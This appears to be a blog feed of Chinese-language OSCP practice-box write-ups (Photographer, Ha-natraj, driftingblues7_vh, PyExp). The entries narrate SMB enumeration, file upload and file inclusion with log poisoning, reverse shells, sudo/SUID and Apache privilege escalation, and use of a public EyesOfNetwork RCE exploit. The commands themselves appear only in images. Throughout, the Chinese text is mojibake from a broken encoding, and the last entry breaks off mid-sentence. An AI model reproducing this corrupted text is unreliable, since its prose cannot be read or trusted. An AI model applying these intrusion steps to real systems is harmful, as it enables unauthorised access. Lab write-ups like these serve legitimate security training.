src="/img/OSCP-Photographer/image-20240701010554998.png" alt="image-20240701010554998"></p><p>è¿™é‡Œæˆ‘åªä¸‹è½½äº†<code>mailsent.txt</code>æ–‡ä»¶ï¼Œå‰©ä¸‹çš„é‚£ä¸ª<code>wordpress.bkp.zip</code>ç–‘ä¼¼æ˜¯å¤‡ä»½æ–‡ä»¶ï¼Œä½†æ˜¯æ–‡ä»¶å¤ªå¤§äº†ï¼Œæš‚æ—¶å…ˆä¸ä¸‹è½½</p><p><img src="/img/OSCP-Photographer/image-20240701010652634.png" alt="image-20240701010652634"></p><p><code>mailsent.txt</code>æ–‡ä»¶æ˜¯ä¸€ä»½ä¿¡ï¼Œå¤§è‡´çš„å†…å®¹æ˜¯<code>agi@photographer.com</code>ç»™<code>daisa@photographer.com</code>å†™çš„ä¸€ä»½ä¿¡ï¼Œä¿¡çš„å†…å®¹ç»™äº†ä¸€ä¸ªå¯†ç çš„æç¤ºï¼Œä½†æ˜¯å¯†ç çš„å†…å®¹å‘¢ï¼Ÿï¼Ÿï¼Ÿæ˜¯<code>my babygirl ;)</code>å…¶ä¸­çš„ä¸€éƒ¨åˆ†å—ï¼Ÿ</p><p>è¿™é‡Œæ²¡æœ‰æ–‡ä»¶åŒ…å«ï¼Œæ‰€ä»¥æš‚æ—¶ä¸é€šè¿‡smbä¸Šä¼ æ–‡ä»¶äº†</p><h2 id="äº”ã€Getshell"><a href="#äº”ã€Getshell" class="headerlink" title="äº”ã€Getshell"></a>äº”ã€Getshell</h2><p>é€šè¿‡smbæ‹¿åˆ°çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå»8000ç™»å½•é¡µè¯•ä¸€è¯•ã€‚å¤šæ¬¡å°è¯•ä¹‹å<code>daisa@photographer.com/babygirl</code>æ˜¯è´¦å·å¯†ç ï¼Œç™»é™†æˆåŠŸ</p><p><img src="/img/OSCP-Photographer/image-20240701011553790.png" alt="image-20240701011553790"></p><p>åŒæ—¶ï¼Œæ ¹æ®å…ˆå‰çš„æç¤ºï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä»»æ„æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼ŒæŠ“åŒ…ä¸Šä¼ ï¼›æ ¹æ®æç¤ºï¼Œéœ€è¦ä¿®æ”¹ä¸¤å¤„åœ°æ–¹</p><p><img src="/img/OSCP-Photographer/image-20240701011810633.png" alt="image-20240701011810633"></p><p> åœ¨é¦–é¡µä¼šæ˜¾ç¤ºæˆ‘ä»¬åˆšåˆšä¸Šä¼ çš„æ–‡ä»¶</p><p><img src="/img/OSCP-Photographer/image-20240701011947837.png" alt="image-20240701011947837"></p><p>æ‰§è¡ŒæˆåŠŸ</p><p><img src="/img/OSCP-Photographer/image-20240701012009739.png" alt="image-20240701012009739"></p><p>åˆ©ç”¨python3è¿›è¡Œåå¼¹shell</p><p><img src="/img/OSCP-Photographer/image-20240701012453411.png" alt="image-20240701012453411"></p><p><img src="/img/OSCP-Photographer/image-20240701012510104.png" alt="image-20240701012510104"></p><h2 id="å…­ã€æƒé™æå‡"><a href="#å…­ã€æƒé™æå‡" class="headerlink" title="å…­ã€æƒé™æå‡"></a>å…­ã€æƒé™æå‡</h2><p>æŸ¥æ‰¾ä¸€ä¸‹SUIDæ–‡ä»¶</p><p><img src="/img/OSCP-Photographer/image-20240701012809586.png" alt="image-20240701012809586"></p><p><img src="/img/OSCP-Photographer/image-20240701012943821.png" alt="image-20240701012943821"></p><p>åˆ©ç”¨ä¸€å¥è¯ç›´æ¥ææƒ</p><p><img src="/img/OSCP-Photographer/image-20240701013113227.png" alt="image-20240701013113227"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Ha-natraj</title>
      <link href="/2024/06/30/OSCP-Ha-natraj/"/>
      <url>/2024/06/30/OSCP-Ha-natraj/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Ha-natraj"><a href="#ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Ha-natraj" class="headerlink" title="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Ha-natraj"></a>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Ha-natraj</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-Ha-natraj/image-20240630145606754.png" alt="image-20240630145606754"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><h3 id="1ã€å¿«é€Ÿæ‰«æ"><a href="#1ã€å¿«é€Ÿæ‰«æ" class="headerlink" title="1ã€å¿«é€Ÿæ‰«æ"></a>1ã€å¿«é€Ÿæ‰«æ</h3><p><img src="/img/OSCP-Ha-natraj/image-20240630145644330.png" alt="image-20240630145644330"></p><h3 id="2ã€å…¨ç«¯å£æ‰«æ"><a href="#2ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="2ã€å…¨ç«¯å£æ‰«æ"></a>2ã€å…¨ç«¯å£æ‰«æ</h3><p><img src="/img/OSCP-Ha-natraj/image-20240630145713927.png" alt="image-20240630145713927"></p><p><img src="/img/OSCP-Ha-natraj/image-20240630145929111.png" alt="image-20240630145929111"></p><h3 id="3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹"><a href="#3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹"></a>3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹</h3><p><img src="/img/OSCP-Ha-natraj/image-20240630145940567.png" alt="image-20240630145940567"></p><p>æ­£å¸¸çš„sshæœåŠ¡å’ŒhttpæœåŠ¡ï¼Œæ˜¯Ubuntuç³»ç»Ÿ</p><h3 id="4ã€æ¼æ´æ¢æµ‹"><a href="#4ã€æ¼æ´æ¢æµ‹" class="headerlink" title="4ã€æ¼æ´æ¢æµ‹"></a>4ã€æ¼æ´æ¢æµ‹</h3><p><img src="/img/OSCP-Ha-natraj/image-20240630150326003.png" alt="image-20240630150326003"></p><p>å‘ç°äº†<code>console</code>å’Œ<code>images</code>ç›®å½•</p><h2 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h2><p>å…ˆå¯¹é¦–é¡µå±•å¼€è°ƒæŸ¥</p><p><img src="/img/OSCP-Ha-natraj/image-20240630150231216.png" alt="image-20240630150231216"></p><p>å¤§è‡´éƒ½æ˜¯å¯¹è¿™ä½<code>Nataraj</code>çš„å°åº¦ç¥è¿›è¡Œäº†è®²è¿°ï¼Œå¹¶æ— æœ‰ä»·å€¼çš„ä¸œè¥¿</p><p>çœ‹ä¸‹nmapæ‰«æå‡ºæ¥çš„<code>console</code>ç›®å½•ï¼Œè¿™ä¸ªç›®å½•çš„åå­—æˆ‘ä»¬è¿˜æ˜¯å¾ˆæ„Ÿå…´è¶£çš„</p><p><img src="/img/OSCP-Ha-natraj/image-20240630150457085.png" alt="image-20240630150457085"></p><p>å™¢ï¼Œæœ‰ä¸ª<code>file.php</code>ï¼Œæ˜¯ä¸ªå¾ˆå¥½çš„ç‚¹</p><p><img src="/img/OSCP-Ha-natraj/image-20240630150525571.png" alt="image-20240630150525571"></p><p>ä¸€ç‰‡ç©ºç™½ï¼Ÿæˆ‘ä»¬FUZZè¯•è¯•</p><p><img src="/img/OSCP-Ha-natraj/image-20240630153904848.png" alt="image-20240630153904848"></p><p>æœ‰<code>file</code>å‚æ•°ï¼ŒæˆåŠŸæŒ–æ˜åˆ°ä¸€ä¸ªæ¼æ´</p><p><img src="/img/OSCP-Ha-natraj/image-20240630153948936.png" alt="image-20240630153948936"></p><h2 id="å››ã€Getshell"><a href="#å››ã€Getshell" class="headerlink" title="å››ã€Getshell"></a>å››ã€Getshell</h2><p>åœ¨ä¸Šé¢çš„<code>/etc/passwd</code>æ–‡ä»¶ä¸­å‘ç°ä¸¤ä¸ªç”¨æˆ·å</p><p><img src="/img/OSCP-Ha-natraj/image-20240630154056230.png" alt="image-20240630154056230"></p><p>PHPä¼ªåè®®è¯»å–è¿™ä¸ª<code>file.php</code>æ–‡ä»¶å†…å®¹</p><p><img src="/img/OSCP-Ha-natraj/image-20240630154321835.png" alt="image-20240630154321835"></p><p>ç›®å‰åªæœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ï¼›èƒ½æƒ³åˆ°çš„æœ‰æ—¥å¿—æ–‡ä»¶åŒ…å«</p><p>æœ¬æƒ³åŒ…å«ä¸€ä¸‹apache çš„æ—¥å¿—ï¼Œä½†æ˜¯æ˜¯ä¸ªç©ºç™½</p><p><img src="/img/OSCP-Ha-natraj/image-20240630155240403.png" alt="image-20240630155240403"></p><p>è½¬å»åŒ…å«å…¶ä»–æ—¥å¿—å»ï¼›Ubuntu çš„ç™»é™†æ—¥å¿—åœ¨<code>/var/log/auth.log</code></p><p><img src="/img/OSCP-Ha-natraj/image-20240630155356137.png" alt="image-20240630155356137"></p><p>OKï¼Œæœ‰ç™»å½•æ—¥å¿—ï¼›é‚£åˆ©ç”¨sshç™»é™†ï¼Œå†™å…¥webshellï¼›è¿™é‡Œç”¨äº†å¾ˆå¤šæ–¹æ³•ï¼Œå‡æœªæˆåŠŸï¼Œæœ€ç»ˆä½¿ç”¨å¦‚ä¸‹æ–¹æ³•</p><p><img src="/img/OSCP-Ha-natraj/image-20240630163039088.png" alt="image-20240630163039088"></p><p>è¿æ¥æˆåŠŸï¼ˆå¦‚æœå¤±è´¥ï¼Œå¯ä»¥é‡ç½®é¶åœºç¯å¢ƒå¤šå°è¯•ï¼‰</p><p><img src="/img/OSCP-Ha-natraj/image-20240630164930178.png" alt="image-20240630164930178"></p><p>å°†shellåå¼¹åˆ°ncä¸Š</p><p><img src="/img/OSCP-Ha-natraj/image-20240630165307264.png" alt="image-20240630165307264"></p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><h3 id="1ã€ææƒè‡³mahakal"><a href="#1ã€ææƒè‡³mahakal" class="headerlink" title="1ã€ææƒè‡³mahakal"></a>1ã€ææƒè‡³mahakal</h3><p>çœ‹åˆ°apacheå¯ä»¥sudo å¼€å¯æš‚åœï¼Œä¹‹åæŸ¥æ‰¾apacheç›¸å…³å¯æ“ä½œçš„å…³é”®æ€§æ–‡ä»¶</p><p><img src="/img/OSCP-Ha-natraj/image-20240630175107120.png" alt="image-20240630175107120"></p><p>é€šè¿‡ä¿®æ”¹apacheçš„è¿è¡Œç”¨æˆ·ï¼Œè¾¾åˆ°ææƒï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦ç®€å•è¯´æ˜ä¸€ä¸‹</p><blockquote><p>è¿™é‡Œä¸èƒ½ä¿®æ”¹æˆrootï¼Œapacheé»˜è®¤ä¸å…è®¸rootå¯åŠ¨ï¼Œå¦‚æœè¦rootå¯åŠ¨ï¼Œéœ€è¦æ·»åŠ â€œ-DBIG_SECURITY_HOLEâ€åˆ°CFLAGSç¯å¢ƒå˜é‡ä¸­é‡æ–°ç¼–è¯‘</p></blockquote><p>å› æ­¤ï¼Œåªèƒ½é€‰æ‹©rootä¹‹å¤–çš„æ™®é€šç”¨æˆ·ï¼›è®°å¾—æŠŠå‰é¢çš„æ³¨é‡Šæ‰</p><p><img src="/img/OSCP-Ha-natraj/image-20240630180950251.png" alt="image-20240630180950251"></p><p>ä¿å­˜é…ç½®æ–‡ä»¶ï¼Œé‡å¯æœåŠ¡å™¨ï¼Œç„¶åé‡æ–°è¿æ¥shellï¼Œæ‹¿åˆ°<code>mahakal</code>ç”¨æˆ·çš„æƒé™ï¼ˆæ³¨æ„å¤šç­‰å¾…ä¼šï¼Œapacheé‡å¯éœ€è¦æ—¶é—´ï¼‰</p><p><img src="/img/OSCP-Ha-natraj/image-20240630181618663.png" alt="image-20240630181618663"></p><h3 id="2ã€ææƒè‡³root"><a href="#2ã€ææƒè‡³root" class="headerlink" title="2ã€ææƒè‡³root"></a>2ã€ææƒè‡³root</h3><p>ä¹‹ååå¼¹shellï¼ŒæŸ¥çœ‹sudo</p><p><img src="/img/OSCP-Ha-natraj/image-20240630181739763.png" alt="image-20240630181739763"></p><p>nmapçš„sudoææƒæ–¹æ³•</p><p><img src="/img/OSCP-Ha-natraj/image-20240630181828812.png" alt="image-20240630181828812">æŸ¥çœ‹nmap çš„ç‰ˆæœ¬</p><p><img src="/img/OSCP-Ha-natraj/image-20240630181939177.png" alt="image-20240630181939177"></p><p>é«˜äº5.21ï¼Œåªèƒ½ç”¨ç¬¬ä¸€ç§æ–¹æ³•</p><p><img src="/img/OSCP-Ha-natraj/image-20240630182126028.png" alt="image-20240630182126028"></p><p>æå–æˆåŠŸ</p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-driftingblues7_vh</title>
      <link href="/2024/06/28/OSCP-driftingblues7-vh/"/>
      <url>/2024/06/28/OSCP-driftingblues7-vh/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”driftingblues7-vh"><a href="#ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”driftingblues7-vh" class="headerlink" title="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”driftingblues7_vh"></a>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”driftingblues7_vh</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-driftingblues7-vh/image-20240628211809756.png" alt="image-20240628211809756"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><h3 id="1ã€å¿«é€Ÿæ‰«æ"><a href="#1ã€å¿«é€Ÿæ‰«æ" class="headerlink" title="1ã€å¿«é€Ÿæ‰«æ"></a>1ã€å¿«é€Ÿæ‰«æ</h3><p><img src="/img/OSCP-driftingblues7-vh/image-20240628211852272.png" alt="image-20240628211852272"></p><h3 id="2ã€å…¨ç«¯å£æ‰«æ"><a href="#2ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="2ã€å…¨ç«¯å£æ‰«æ"></a>2ã€å…¨ç«¯å£æ‰«æ</h3><p><img src="/img/OSCP-driftingblues7-vh/image-20240628212125320.png" alt="image-20240628212125320"></p><h3 id="3ã€ç‰ˆæœ¬ç³»ç»Ÿæ¢æµ‹"><a href="#3ã€ç‰ˆæœ¬ç³»ç»Ÿæ¢æµ‹" class="headerlink" title="3ã€ç‰ˆæœ¬ç³»ç»Ÿæ¢æµ‹"></a>3ã€ç‰ˆæœ¬ç³»ç»Ÿæ¢æµ‹</h3><p><img src="/img/OSCP-driftingblues7-vh/image-20240628212534300.png" alt="image-20240628212534300"></p><p>66ç«¯å£æ˜¯ä¸ªpythonå¼€æ”¾çš„httpæœåŠ¡ï¼Œ80ç«¯å£æ˜¯httpæœåŠ¡ï¼Œä½†æ˜¯é‡å®šå‘åˆ°äº†443çš„httpsæœåŠ¡ï¼Œ443æ˜¯httpsæœåŠ¡ï¼Œ2403å¼€æ”¾äº†ä¸€ä¸ªç«¯å£ï¼Œ<code>taskmaster2000?</code>æ˜¯ä¸€ä¸ªæœªçŸ¥çš„æœåŠ¡ï¼Œ3306æ˜¯mysqlæœåŠ¡ï¼Œ8086ä¹Ÿæ˜¯ä¸€ä¸ªhttpæœåŠ¡</p><h3 id="4ã€ç«¯å£æ¼æ´æ¢æµ‹"><a href="#4ã€ç«¯å£æ¼æ´æ¢æµ‹" class="headerlink" title="4ã€ç«¯å£æ¼æ´æ¢æµ‹"></a>4ã€ç«¯å£æ¼æ´æ¢æµ‹</h3><p><img src="/img/OSCP-driftingblues7-vh/image-20240628212544334.png" alt="image-20240628212544334"></p><p>åœ¨443å‘ç°äº†ä¸€ä¸ªå¯èƒ½çš„csrfæ¼æ´</p><h2 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€66ç«¯å£ä¿¡æ¯æ”¶é›†"><a href="#1ã€66ç«¯å£ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€66ç«¯å£ä¿¡æ¯æ”¶é›†"></a>1ã€66ç«¯å£ä¿¡æ¯æ”¶é›†</h3><p>å…ˆå¯¹66ç«¯å£çš„httpæœåŠ¡ä¸‹åˆ€</p><p>çœ‹ä¸€ä¸‹æºä»£ç </p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628221237089.png" alt="image-20240628221237089"></p><p>ç”±æœ¬åœ°çš„jsæ–‡ä»¶ï¼Œçœ‹è¿™ä¸ª<code>index_files/</code>ç›®å½•ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Š</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628221254258.png" alt="image-20240628221254258"></p><p>å¯¹66ç«¯å£æ‰«ä¸€ä¸‹</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628221157433.png" alt="image-20240628221157433"></p><p>å•Šå˜ï¼Œ<code>.bash_history</code>æ–‡ä»¶ï¼Œè¿™æ˜¯æŸä¸ªç”¨æˆ·çš„å®¶ç›®å½•å—ï¼Ÿ</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628221528945.png" alt="image-20240628221528945"></p><p>æˆ‘ä»¬å¯¹<code>/etc/hosts</code>æ–‡ä»¶å¾ˆæ„Ÿå…´è¶£ï¼Œä»¥åŠ<code>flag.txt</code>æ–‡ä»¶ï¼Œè¿™é‡Œå…ˆè®°å½•ä¸‹æ¥è¿™äº›æ–‡ä»¶</p><p>ç»§ç»­çœ‹<code>.bash_profile</code>æ–‡ä»¶ï¼Œè¿™é‡Œå¯¹è¿™ä¸ªæ–‡ä»¶åšç®€å•çš„ä»‹ç»</p><blockquote><p>.bash_prfile æ–‡ä»¶æ˜¯ç”¨æˆ·ç™»é™†ä¹‹ååˆå§‹åŒ–çš„æ–‡ä»¶ã€‚å³å½“ç”¨æˆ·ç™»é™†ä¹‹åï¼Œä¼šå…ˆæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œå¾ˆå¤šæ—¶å€™è¿™ä¸ªæ–‡ä»¶ä¼šè¢«é»‘å®¢å†™å…¥åå¼¹å‘½ä»¤ï¼Œä»è€Œæˆä¸ºä¸€ç§æƒé™ç»´æŒçš„æ‰‹æ®µ</p></blockquote><p><img src="/img/OSCP-driftingblues7-vh/image-20240628222337276.png" alt="image-20240628222337276"></p><p>è¿™é‡Œåªæ˜¯åœ¨åŸå…ˆçš„PATHè·¯å¾„ä¸ŠåŠ ä¸Šäº†å®¶ç›®å½•ä¸‹çš„<code>/bin</code>ç›®å½•ï¼Œå¹¶é‡æ–°åŠ è½½PATH</p><p>çœ‹ä¹‹åçš„<code>.cshrc</code>æ–‡ä»¶ï¼Œ<code>alias</code>åšäº†ä¸€äº›åˆ«åè®¾ç½®</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628222636891.png" alt="image-20240628222636891"></p><p>ä¹‹åçœ‹<code>flag.txt</code>æ–‡ä»¶ï¼Œæ²¡å•¥ç”¨æ˜‚</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628222609072.png" alt="image-20240628222609072"></p><p>ç»§ç»­å®Œåçœ‹ï¼Œ<code>.pki</code>ç›®å½•å•¥ä¹Ÿæ²¡æœ‰</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628222926970.png" alt="image-20240628222926970"></p><p><code>index_files</code>ç›®å½•ä¸‹æˆ‘ä»¬åœ¨æµè§ˆå™¨çœ‹è¿‡çš„ï¼Œæœ‰å¾ˆå¤šjs æ–‡ä»¶</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628223001531.png" alt="image-20240628223001531"></p><h3 id="2ã€80ã€443ç«¯å£ä¿¡æ¯æ”¶é›†"><a href="#2ã€80ã€443ç«¯å£ä¿¡æ¯æ”¶é›†" class="headerlink" title="2ã€80ã€443ç«¯å£ä¿¡æ¯æ”¶é›†"></a>2ã€80ã€443ç«¯å£ä¿¡æ¯æ”¶é›†</h3><p>æˆ‘ä»¬æ‰“å¼€80ç«¯å£å°±è·³è½¬åˆ°äº†443</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628223058805.png" alt="image-20240628223058805"></p><p>å±•å¼€ä¸€ä¸ªç›®å½•æ‰«æï¼Œåªè¦200ï¼Œå› ä¸ºå¤§éƒ½302è·³è½¬åˆ°ç™»é™†é¡µé¢äº†</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628223835494.png" alt="image-20240628223835494"></p><p>çœ‹<code>README.md</code>æ–‡ä»¶å†…å®¹</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224039258.png" alt="image-20240628224039258"></p><p>è¿™æç¤ºä¸å°±æ¥äº†ï¼ŒæŸ¥äº†ä¸€ä¸‹<code>EyesOfNetwork</code>çš„ä¿¡æ¯</p><blockquote><p>â€œEyesOfNetworkâ€ æ˜¯ä¸€ä¸ªç½‘ç»œç›‘æ§å·¥å…·ï¼Œå®ƒå¯ä»¥å¸®åŠ©ç”¨æˆ·ç›‘æ§ç½‘ç»œæµé‡å’Œåˆ†æç½‘ç»œè¡Œä¸ºã€‚è¿™ä¸ªå·¥å…·é€šå¸¸ç”¨äºç½‘ç»œå®‰å…¨é¢†åŸŸï¼Œä»¥æ£€æµ‹æ½œåœ¨çš„å¨èƒå’Œå¼‚å¸¸è¡Œä¸ºã€‚</p></blockquote><p>åé¢ç»™äº†ç‰ˆæœ¬å·<code>5.3</code>ï¼Œç¬¬ä¸€æ—¶é—´å½“ç„¶æ˜¯æŸ¥ä¸€ä¸‹æœ‰æ— æ¼æ´</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224441375.png" alt="image-20240628224441375"></p><p>å¯¹è¿™å‡ ä¸ªéƒ½æŒºæœŸå¾…çš„ï¼Œçœ‹æœ€åä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224553130.png" alt="image-20240628224553130"></p><p>py3çš„ï¼Œç›´æ¥æ‰§è¡Œä¸€ä¸‹è¯•è¯•</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224644382.png" alt="image-20240628224644382"></p><p>çœ‹æ¥æ˜¯æ¯”è¾ƒæˆåŠŸçš„ï¼Œå‘ç°äº†Adminç”¨æˆ·çš„keyï¼Œå¹¶åˆ›å»ºäº†ç”¨æˆ·å<code>h4ker</code></p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224836055.png" alt="image-20240628224836055"></p><p>è¿™é‡Œæ˜¾ç¤ºç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œæœ‰ç‚¹æ‡µæ˜‚ã€‚æŸ¥äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªè„šæœ¬çš„åˆ©ç”¨åœ¨ç¬¬ä¸‰ã€å››è¡Œï¼Œå°±æ˜¯è¿™é‡Œ</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628225617382.png" alt="image-20240628225617382"></p><h2 id="å››ã€è·å–rootæƒé™"><a href="#å››ã€è·å–rootæƒé™" class="headerlink" title="å››ã€è·å–rootæƒé™"></a>å››ã€è·å–rootæƒé™</h2><p>å› ä¸ºä¸Šé¢æ˜¾ç¤ºç›‘å¬åœ¨443ç«¯å£äº†ï¼Œæ‰€ä»¥ç«¯å£é‚£é‡Œä½¿ç”¨443</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628225900433.png" alt="image-20240628225900433"></p><p>whatï¼Ÿ</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628230100328.png" alt="image-20240628230100328"></p><p>ä¸åœ¨dockeré‡Œé¢</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628230125878.png" alt="image-20240628230125878"></p><p>whatï¼Ÿè¿™å°±å®Œäº‹å„¿äº†ï¼Ÿ</p><p>å¯¹å…¶ä»–ç«¯å£å±•å¼€äº†ä¸€äº›è°ƒæŸ¥ï¼Œå‘ç°ç¡®å®è·å–ä¸äº†å…¶ä»–ä¿¡æ¯äº†</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628230540264.png" alt="image-20240628230540264"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”PyExpvm</title>
      <link href="/2024/06/28/OSCP-PyExp/"/>
      <url>/2024/06/28/OSCP-PyExp/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”PyExpvm"><a href="#ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”PyExpvm" class="headerlink" title="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”PyExpvm"></a>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”PyExpvm</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-PyExp/image-20240627232247823.png" alt="image-20240627232247823"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><h3 id="1ã€å¿«é€Ÿæ‰«æ"><a href="#1ã€å¿«é€Ÿæ‰«æ" class="headerlink" title="1ã€å¿«é€Ÿæ‰«æ"></a>1ã€å¿«é€Ÿæ‰«æ</h3><p><img src="/img/OSCP-PyExp/image-20240627232324271.png" alt="image-20240627232324271"></p><h3 id="2ã€å…¨ç«¯å£æ‰«æ"><a href="#2ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="2ã€å…¨ç«¯å£æ‰«æ"></a>2ã€å…¨ç«¯å£æ‰«æ</h3><p><img src="/img/OSCP-PyExp/image-20240627232553908.png" alt="image-20240627232553908"></p><p><img src="/img/OSCP-PyExp/image-20240627235748090.png" alt="image-20240627235748090"></p><p>åªå¼€æ”¾äº†1337ã€3306ç«¯å£</p><h3 id="3ã€é’ˆå¯¹å¼€æ”¾ç«¯å£åšè¯¦ç»†æ¢æµ‹"><a href="#3ã€é’ˆå¯¹å¼€æ”¾ç«¯å£åšè¯¦ç»†æ¢æµ‹" class="headerlink" title="3ã€é’ˆå¯¹å¼€æ”¾ç«¯å£åšè¯¦ç»†æ¢æµ‹"></a>3ã€é’ˆå¯¹å¼€æ”¾ç«¯å£åšè¯¦ç»†æ¢æµ‹</h3><p><img src="/img/OSCP-PyExp/image-20240628000021819.png" alt="image-20240628000021819"></p><p>1337æ˜¯sshæœåŠ¡ï¼Œ3306æ˜¯mysqlæ•°æ®åº“æœåŠ¡ï¼›æ¨æµ‹è·‘åœ¨LinxuæœåŠ¡å™¨ä¸Š</p><p>è¿™é‡Œå¾ˆå¥‡æ€ªï¼Œæ²¡æœ‰webæœåŠ¡å¼€æ”¾ï¼Œæ¨æµ‹åº”è¯¥åœ¨mysqlä¸­æ‹¿ä¿¡æ¯</p><h3 id="4ã€é’ˆå¯¹å¼€æ”¾ç«¯å£åšæ¼æ´æ¢æµ‹"><a href="#4ã€é’ˆå¯¹å¼€æ”¾ç«¯å£åšæ¼æ´æ¢æµ‹" class="headerlink" title="4ã€é’ˆå¯¹å¼€æ”¾ç«¯å£åšæ¼æ´æ¢æµ‹"></a>4ã€é’ˆå¯¹å¼€æ”¾ç«¯å£åšæ¼æ´æ¢æµ‹</h3><p>è™½ç„¶è¿™æ ·æ¢æµ‹å‡ºæ¥çš„å¯èƒ½æ€§å¾®ä¹å…¶å¾®ï¼Œä½†å¿…è¦çš„æµç¨‹è¿˜æ˜¯èµ°ä¸€ä¸‹</p><p><img src="/img/OSCP-PyExp/image-20240628000437268.png" alt="image-20240628000437268"></p><p>è¿™é‡Œç»™äº†å‡ 